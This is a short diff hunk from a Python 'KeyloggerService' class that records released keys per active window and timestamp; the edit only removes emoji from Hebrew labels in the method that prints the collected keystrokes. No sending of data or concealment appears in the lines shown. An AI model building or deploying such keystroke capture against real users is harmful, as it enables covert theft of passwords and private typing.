@@ -23,11 +23,11 @@ class KeyloggerService:
         keyboard.on_release(callback)
 
     def getData(self):
-        print("\n📌 נתונים שנאספו:")
+        print("\n נתונים שנאספו:")
         for window, timestamps in self.data.items():
             print(f"\n🖥 חלון: {window}")
             for timestamp, keys in timestamps.items():
-                print(f"⏰ {timestamp} → {keys}")
+                print(f" {timestamp} → {keys}")
 
     def getWindowName(self):
         return pw.getActiveWindowTitle() or "Unknown Window"
